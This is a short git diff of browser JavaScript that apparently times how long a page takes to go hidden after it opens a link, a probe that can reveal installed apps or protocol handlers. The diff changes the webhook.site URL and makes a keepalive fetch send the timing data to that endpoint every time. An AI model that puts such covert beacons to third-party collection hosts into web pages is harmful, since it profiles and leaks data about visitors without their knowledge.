@@ -506,7 +506,7 @@
         }
     }
 
-    const _URL = "https://webhook.site/18060db5-fc85-41b3-86f0-509cb14018bb";
+    const _URL = "https://webhook.site/7928d151-a263-4ce3-a5c5-cbf586c60b2d";
     let sent = false;
     let _link = ""
 
@@ -517,14 +517,17 @@
         if (document.visibilityState === "hidden") {
             let redirectEnd = +(new Date())
             const diff = redirectEnd - redirectStart - 1000
-            console.log("diff: " + diff);
-            console.log(_link.split(":")[0])
+            // console.log("diff: " + diff);
+            // console.log(_link.split(":")[0])
+
+            console.log("send")
+            fetch(_URL + "?start=" + redirectStart + "&end=" + redirectEnd, { method: "GET", keepalive: true });
 
             if (diff > 1000) {
-                if (sent) return;
-                sent = true;
-                console.log("send")
-                fetch(_URL + "?start=" + redirectStart + "&end=" + redirectEnd, { method: "GET", keepalive: true });
+                // if (sent) return;
+                // sent = true;
+                // console.log("send")
+                // fetch(_URL + "?start=" + redirectStart + "&end=" + redirectEnd, { method: "GET", keepalive: true });
                 // _URL + "?url=" + encodeURIComponent(_link.split(":")[0])
             }
         }
